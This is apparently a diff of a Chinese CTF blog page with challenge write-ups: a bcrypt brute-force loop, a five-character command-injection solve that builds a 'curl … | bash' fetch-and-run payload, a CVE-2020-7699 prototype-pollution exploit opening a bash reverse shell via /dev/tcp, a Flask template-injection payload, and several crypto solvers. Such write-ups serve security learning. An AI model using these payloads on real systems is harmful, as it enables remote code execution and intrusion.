+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>; </span><br><span class="line">$key = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>; </span><br><span class="line">$bcrypt = <span class="keyword">new</span> Bcrypt(); </span><br><span class="line">$plaintext = <span class="string">'bcrypt'</span>;<span class="comment">//bcryptyyds </span></span><br><span class="line">$ciphertext = <span class="string">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">26</span>;$i++) &#123; </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">26</span>;$j++) &#123; </span><br><span class="line">        <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;<span class="number">26</span>;$k++) &#123; </span><br><span class="line">            <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;<span class="number">26</span>;$m++) &#123; </span><br><span class="line">                <span class="keyword">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class="line">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class="line">                <span class="keyword">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"&lt;/br&gt;Password verified!&lt;/br&gt;"</span>); </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"Wow!!Now,hack it!&lt;/br&gt;"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>最终的考点就是命令执行可以参考hitcon-ctf-2017</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> 😁😁<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $🏁,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">	$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">	mkdir($path);</span><br><span class="line">	chdir($path);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">		<span class="comment">//</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">		@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这道题大概意思就是存在命令执行，但单次输入字符不得大于5。因此利用linux下特有的命令来写入shell反弹。原理就是利用curl ip|bash等很多方式去反弹shell。顺便也复习了反弹shell的一些基本操作</p>
+<p>官方的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">url = <span class="string">"http://219.219.61.234:10048/?cmd="</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g" '</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate "curl 0X2761697D|bash"</span></span><br><span class="line">    <span class="string">'&gt;sh '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7D\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\'</span>,</span><br><span class="line">    <span class="string">'&gt;61\\'</span>,</span><br><span class="line">    <span class="string">'&gt;27\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0X\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    data = &#123; <span class="string">'passwd'</span>:<span class="string">'bcryptyyds'</span>, &#125;</span><br><span class="line">    header = &#123; <span class="string">"Content-Type"</span> : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">               <span class="string">"Accept"</span> : <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">               <span class="string">"Upgrade-Insecure-Requests"</span> : <span class="string">"1"</span> &#125;</span><br><span class="line">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
+<p>这个很郁闷，配置环境很长时间还是没能弄出来</p>
+<h2 id="EZnode"><a href="#EZnode" class="headerlink" title="EZnode"></a>EZnode</h2><p>应该是国赛分区赛的题</p>
+<h3 id="考点-3"><a href="#考点-3" class="headerlink" title="考点"></a>考点</h3><p>nginx反向代理配置错误</p>
+<p>首先来学习一下ngnix</p>
+<h3 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h3><p>ngnix是一款自由的、开源的、高性能的HTTP服务器和反向代理服务器。</p>
+<p>主要在三个方面</p>
+<ul>
+<li>反向代理</li>
+<li>负载均衡</li>
+<li>nginx特点</li>
+</ul>
+<p><strong>反向代理</strong></p>
+<blockquote>
+<p>先说正向代理</p>
+<p>客户端非常明确要访问的服务器地址；服务器只清楚请求来自哪个代理服务器，而不清楚来自哪个具体的客户端；正向代理模式屏蔽或者隐藏了真实客户端信息。</p>
+</blockquote>
+<p><img src="/2100/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p>
+<p>上面这个图就很形象了</p>
+<p>多个客户端给服务器发送的请求，nginx服务器接收到之后，</p>
+<p>按照一定的规则分发给了后端的业务处理服务器进行处理了。</p>
+<p>此时~请求的来源也就是客户端是明确的，但是请求具体由哪台服务器处理的并不明确了，nginx扮演的就是一个反向代理角色</p>
+<p><strong>负载均衡</strong></p>
+<p>在反向代理中</p>
+<p>客户端会向服务端发出请求，而服务器将接受到的请求按照规则分发的过程，就叫做负载均衡</p>
+<p><strong>ngnix配置</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">main                                # 全局配置</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginx工作模式配置</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # http设置</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # 服务器主机配置</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # 路由配置</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # 负载均衡配置</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现有目录穿越漏洞参考</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
+<p>/static../</p>
+<p><img src="/2100/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p>
+<p>之后就是找cve了，比较菜，只能学习</p>
+<p>cve-2020-7699</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
+<p>之后反弹shell，执行命令。</p>
+
       
     </div>
 
@@ -273,7 +362,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-09-27 23:28:48" itemprop="dateModified" datetime="2020-09-27T23:28:48+08:00">2020-09-27</time>
+                <time title="修改时间：2020-10-24 17:54:47" itemprop="dateModified" datetime="2020-10-24T17:54:47+08:00">2020-10-24</time>
               </span>
 
           
@@ -282,7 +371,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>132</span>
+              <span>148</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -400,6 +489,229 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2099/09/27/BUU%E5%88%B7%E9%A2%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/timg.jpeg">
+      <meta itemprop="name" content="Pz1o">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pz1o's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/" class="post-title-link" itemprop="url">CUMT2020华为杯</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-24 17:53:38 / 修改时间：17:54:27" itemprop="dateCreated datePublished" datetime="2020-10-24T17:53:38+08:00">2020-10-24</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="CUMT华为杯"><a href="#CUMT华为杯" class="headerlink" title="CUMT华为杯"></a>CUMT华为杯</h1><p>web狗活成了各方向签到手…</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p>模板注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h2><p>f12摇奖得flag</p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello_world"></a>hello_world</h2><p>异或</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">d=[]</span><br><span class="line">b = <span class="string">"is_easy_right?"</span></span><br><span class="line">a = [<span class="string">'2A'</span>, <span class="string">'26'</span>, <span class="string">'12'</span>, <span class="string">'31'</span>, <span class="string">'1A'</span>, <span class="string">'7'</span>, <span class="string">'11'</span>, <span class="string">'3A'</span>, <span class="string">'2D'</span>, <span class="string">'0F'</span>, <span class="string">'0E'</span>,<span class="string">'1A'</span>, <span class="string">'41'</span>, <span class="string">'4B'</span>, <span class="string">'36'</span>, <span class="string">'43'</span>, <span class="string">'31'</span>, <span class="string">'0'</span>, <span class="string">'3E'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'35'</span>,<span class="string">'1D'</span>, <span class="string">'10'</span>, <span class="string">'38'</span>, <span class="string">'11'</span>, <span class="string">'44'</span>, <span class="string">'4A'</span>, <span class="string">'1B'</span>, <span class="string">'2C'</span>, <span class="string">'2B'</span>, <span class="string">'17'</span>,<span class="string">'50'</span>,<span class="string">'3'</span>, <span class="string">'4'</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> a:</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    z = x</span><br><span class="line">    c += <span class="string">'0x'</span></span><br><span class="line">    c +=z</span><br><span class="line">    d.append(c)</span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">35</span>):</span><br><span class="line">    c = int(a[i],<span class="number">16</span>)</span><br><span class="line">    m = i%<span class="number">14</span></span><br><span class="line">    print(chr(ord((b[m]))^c),end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="non-name"><a href="#non-name" class="headerlink" title="non_name"></a>non_name</h2><p>四元一次方程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">12</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">34</span>, <span class="number">45</span>, <span class="number">56</span>, <span class="number">32</span>, <span class="number">85</span>, <span class="number">43</span>]</span><br><span class="line">c = [<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">    sum1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        print(<span class="string">"%s*%s"</span>%(b[i*<span class="number">4</span>+j],c[j]),end=<span class="string">'+'</span>)</span><br><span class="line">    print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#116 103 102 114</span></span><br></pre></td></tr></table></figure>
+<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="Classical"><a href="#Classical" class="headerlink" title="Classical"></a>Classical</h2><p>维吉尼亚密码，上网down脚本，猜密钥，跑出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn."</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, key)</span>:</span></span><br><span class="line">    cipher = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> message[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> message[i].islower():</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'a'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cipher += chr((ord(message[i]) - ord(<span class="string">'A'</span>) + offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher += message[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(cipher, key)</span>:</span></span><br><span class="line">    explain = <span class="string">''</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> key[j % len(key)].islower():</span><br><span class="line">            offset = ord(key[j % len(key)]) - ord(<span class="string">'a'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> key[j % len(key)].isupper():</span><br><span class="line">                offset = ord(key[j % len(key)]) - ord(<span class="string">'A'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                offset = ord(key[j % len(key)]) - <span class="number">48</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cipher[i].isalpha():</span><br><span class="line">            <span class="keyword">if</span> cipher[i].islower():</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'a'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'a'</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                explain += chr((ord(cipher[i]) - ord(<span class="string">'A'</span>) - offset) % <span class="number">26</span> + ord(<span class="string">'A'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            explain += cipher[i]</span><br><span class="line">            j -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> explain</span><br><span class="line"></span><br><span class="line">print(decrypt(cipher,<span class="string">'Lethelastctf'</span>))</span><br><span class="line"></span><br><span class="line">CUMTCTF&#123;EnjoyTheVigenereCipher&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h2><p>大数e</p>
+<p>可以判断是wiener attack</p>
+<p>上网直接down脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;&#39;</span><br><span class="line">Created on Dec 14, 2011</span><br><span class="line"></span><br><span class="line">@author: pablocelayes</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">import ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"></span><br><span class="line">def hack_RSA(e,n):</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    Finds d knowing (e,n)</span><br><span class="line">    applying the Wiener continued fraction attack</span><br><span class="line">    &#39;&#39;&#39;</span><br><span class="line">    frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    for (k,d) in convergents:</span><br><span class="line">        </span><br><span class="line">        #check if d is actually the 